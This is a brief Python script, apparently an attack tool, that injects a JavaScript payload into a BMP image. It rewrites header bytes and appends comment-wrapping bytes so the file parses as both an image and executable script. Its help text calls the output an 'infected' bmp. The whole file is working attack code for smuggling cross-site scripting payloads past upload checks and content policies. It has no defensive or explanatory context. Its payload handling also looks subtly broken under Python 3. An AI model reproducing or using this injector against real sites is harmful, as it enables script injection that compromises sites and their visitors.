#!/usr/bin/env python
import os
import argparse

def injectFile(payload, fname):
    f = open(fname,"r+b")
    b = f.read()
    f.close()

    f = open(fname,"w+b")
    f.write(b)
    f.seek(2,0)
    f.write(b'\x2F\x2A')
    f.close()

    f = open(fname,"a+b")
    f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
    f.write(payload)
    f.close()
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("filename",help="the bmp file name to infected")
    parser.add_argument("js_payload",help="the payload to be injected. For exampe: \"alert(1);\"")
    args = parser.parse_args()
    injectFile(args.js_payload, args.filename)
